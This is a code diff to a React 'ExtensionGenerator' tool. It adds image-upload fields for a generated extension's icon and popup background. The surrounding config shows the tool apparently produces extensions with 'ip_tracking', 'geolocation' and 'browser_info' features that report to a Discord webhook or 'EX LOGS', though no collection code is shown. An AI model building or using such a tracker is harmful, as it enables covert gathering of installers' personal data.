@@ -33,6 +33,8 @@ interface ExtensionConfig {
   features: string[];
   webhookUrl: string;
   customCode: string;
+  profilePicture?: string;
+  backgroundImage?: string;
 }
 
 export default function ExtensionGenerator() {
@@ -43,7 +45,9 @@ export default function ExtensionGenerator() {
     permissions: ['activeTab', 'storage', 'tabs'],
     features: ['ip_tracking', 'geolocation', 'browser_info'],
     webhookUrl: '',
-    customCode: ''
+    customCode: '',
+    profilePicture: undefined,
+    backgroundImage: undefined
   });
   const [isGenerating, setIsGenerating] = useState(false);
   const { toast } = useToast();
@@ -245,6 +249,52 @@ export default function ExtensionGenerator() {
                 <p className="text-xs text-gray-400 mt-1">
                   Optional: Create a webhook in your Discord server to receive notifications. Leave empty to only use EX LOGS.
                 </p>
+              </div>
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <Label htmlFor="profilePicture" className="text-gray-300">Extension Profile Picture (Optional)</Label>
+                  <Input
+                    id="profilePicture"
+                    type="file"
+                    accept="image/*"
+                    onChange={(e) => {
+                      const file = e.target.files?.[0];
+                      if (file) {
+                        const reader = new FileReader();
+                        reader.onload = (event) => {
+                          setConfig(prev => ({ ...prev, profilePicture: event.target?.result as string }));
+                        };
+                        reader.readAsDataURL(file);
+                      }
+                    }}
+                    className="bg-white/5 border-white/20 text-white file:bg-blue-500/20 file:border-0 file:text-blue-300 file:mr-2 file:px-3 file:py-1 file:rounded"
+                  />
+                  <p className="text-xs text-gray-400 mt-1">
+                    Upload any size image for the extension icon/profile picture
+                  </p>
+                </div>
+                <div>
+                  <Label htmlFor="backgroundImage" className="text-gray-300">Extension Background (Optional)</Label>
+                  <Input
+                    id="backgroundImage"
+                    type="file"
+                    accept="image/*"
+                    onChange={(e) => {
+                      const file = e.target.files?.[0];
+                      if (file) {
+                        const reader = new FileReader();
+                        reader.onload = (event) => {
+                          setConfig(prev => ({ ...prev, backgroundImage: event.target?.result as string }));
+                        };
+                        reader.readAsDataURL(file);
+                      }
+                    }}
+                    className="bg-white/5 border-white/20 text-white file:bg-purple-500/20 file:border-0 file:text-purple-300 file:mr-2 file:px-3 file:py-1 file:rounded"
+                  />
+                  <p className="text-xs text-gray-400 mt-1">
+                    Upload any size background image for the extension popup
+                  </p>
+                </div>
               </div>
             </CardContent>
           </Card>
